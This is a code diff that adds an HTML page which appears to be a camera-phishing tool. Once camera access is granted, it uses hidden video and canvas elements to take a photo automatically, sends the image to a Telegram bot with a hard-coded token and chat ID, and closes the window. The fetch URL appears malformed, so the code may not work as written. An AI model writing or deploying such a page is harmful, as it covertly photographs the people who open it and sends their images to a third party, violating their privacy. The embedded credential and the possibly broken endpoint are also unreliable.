@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Take a Photo</title>
+</head>
+<body>
+    <h1>Taking Photo...</h1>
+    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
+    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+
+    <script>
+        // Access the device camera
+        const video = document.getElementById('video');
+
+        // Get access to the camera
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then((stream) => {
+                video.srcObject = stream;
+
+                // Set a timer to take the photo automatically after a delay
+                setTimeout(() => {
+                    takePhoto();
+                }, 3000); // 3000 milliseconds = 3 seconds
+            });
+
+        // Function to take the photo and send to Telegram
+        function takePhoto() {
+            const canvas = document.getElementById('canvas');
+            const context = canvas.getContext('2d');
+            context.drawImage(video, 0, 0, 640, 480);
+
+            // Convert to Blob
+            canvas.toBlob((blob) => {
+                // Create FormData to send the image
+                const formData = new FormData();
+                formData.append('photo', blob, 'photo.png');
+
+                // Send the photo to your Telegram bot (replace YOUR_BOT_TOKEN and CHAT_ID)
+                fetch(`https://api.telegram.org/7930888633:AAEAftPWzKtmfO9gl6K-8yNhvA2cdN5q41s/sendPhoto?chat_id=6539163634`, {
+                    method: 'POST',
+                    body: formData,
+                })
+                .then(response => {
+                    if (response.ok) {
+                        alert('Photo sent to Telegram!');
+                    } else {
+                        alert('Failed to send photo.');
+                    }
+                })
+                .catch(err => {
+                    alert('Error sending photo: ' + err);
+                })
+                .finally(() => {
+                    // Close the window after sending the photo
+                    window.close();
+                });
+            }, 'image/png');
+        }
+    </script>
+</body>
+</html>
